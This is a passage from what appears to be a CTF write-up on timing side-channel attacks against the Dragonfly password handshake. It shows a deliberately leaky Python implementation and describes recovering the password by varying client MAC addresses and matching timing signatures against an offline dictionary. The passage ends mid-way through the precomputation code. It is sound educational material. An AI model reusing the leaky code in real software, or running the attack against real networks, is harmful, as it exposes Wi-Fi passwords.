Many of the attacks were the same as initially outlined by Trevor Perrin as well as many other cryptographers in 2013.</p>
<p>The team also invented some novel mechanisms to attack Brainpool curves in particular. They proved that the
hardening attempts with computing random values would provide statistical anomalies detectable by calculating timing variance.</p>
<p>What&#x27;s even worse, under EAP-PWD (dragonfly with enterprise wifi), they found that implementaitons also accepted invalid curves, bypassing the password altogether.</p>
<p>Hardening was added to eliminate the remaining sidechannels.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-ctf-challenge">The CTF Challenge<a href="#the-ctf-challenge" class="hash-link" aria-label="Direct link to The CTF Challenge" title="Direct link to The CTF Challenge">​</a></h2>
<p>The qualifier&#x27;s challenge celebrates these timing failures.  Players had to remotely exploit a python implementation of Dragonfly
that had the initial hardening only (always running 40 rounds).</p>
<p>The key insight is that the KDF for dragonfly is malleable based on the client&#x27;s MAC address. Providing different MAC addresses
creates unique timing signatures for a given AP MAC address and Password Shared Key.</p>
<p>The timing signature can then be compared offline against a password list to find the real password.
With a vulnerable implementation this timing sidechannel is actually a lot more effective to exploit
than cracking WPA2 keys which are protected with PBKDF2.</p>
<p>The easiest timing differences to exploit are that lines [2] and [3] only happen sometimes.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">initiate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> other_mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> k</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    See algorithm in https://tools.ietf.org/html/rfc7664</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    in section 3.2.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    &quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">other_mac </span><span class="token operator">=</span><span class="token plain"> other_mac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    found </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    num_valid_points </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    counter </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    n </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">bit_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Find x</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> counter </span><span class="token operator">&lt;=</span><span class="token plain"> k</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        base </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">compute_hashed_password</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        temp </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">key_derivation_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&#x27;Dragonfly Hunting And Pecking&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> temp </span><span class="token operator">&gt;=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        seed </span><span class="token operator">=</span><span class="token plain"> temp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        val </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">secure_curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">seed</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">secure_is_quadratic_residue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">val</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> num_valid_points </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">5</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                x </span><span class="token operator">=</span><span class="token plain"> seed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                save </span><span class="token operator">=</span><span class="token plain"> base</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                found </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                num_valid_points </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Got point after {} iterations&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> found </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">error</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;No valid point found after {} iterations&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">k</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain"> found </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># https://crypto.stackexchange.com/questions/6777/how-to-calculate-y-value-from-yy-mod-prime-efficiently</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># https://rosettacode.org/wiki/Tonelli-Shanks_algorithm</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        y </span><span class="token operator">=</span><span class="token plain"> tonelli_shanks</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        PE </span><span class="token operator">=</span><span class="token plain"> Point</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> y</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># check valid point</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">pow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">y</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">PE </span><span class="token operator">=</span><span class="token plain"> PE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">valid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">PE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">True</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To expand the timing window, so that players from around the world can exploit this remotely over TCP,
many more multiplications were added through a &quot;masking&quot; operation where random values are computed
alongside the real one at random, raising their cost to hundreds of milliseconds.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">secure_curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    Do not leak hamming weights to power analysis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    &quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    idx </span><span class="token operator">=</span><span class="token plain"> secrets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">randbelow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">defense_masks </span><span class="token operator">+</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tmp </span><span class="token operator">=</span><span class="token plain"> defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">curve_equation</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">secure_is_quadratic_residue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">&quot;&quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    Do not leak hamming weights to power analysis</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">    &quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    idx </span><span class="token operator">=</span><span class="token plain"> secrets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">randbelow</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">defense_masks </span><span class="token operator">+</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dN</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">is_quadratic_residue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> defense</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">idx</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In practice this is good enough for several teams to attack the service simultaneously.</p>
<p>To effectively precompute passwords, an attacker can create an offline dictionary that only hashes and
skips the large number math.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">initiate</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> other_mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> k</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">other_mac </span><span class="token operator">=</span><span class="token plain"> other_mac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    counter </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    counter2 </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    n </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">bit_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Find x</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> counter </span><span class="token operator">&lt;=</span><span class="token plain"> k</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        base </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">compute_hashed_password</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        temp </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">key_derivation_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">n</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> base</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b&#x27;Dragonfly Hunting And Pecking&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> temp </span><span class="token operator">&gt;=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        counter2 </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        counter </span><span class="token operator">=</span><span class="token plain"> counter </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    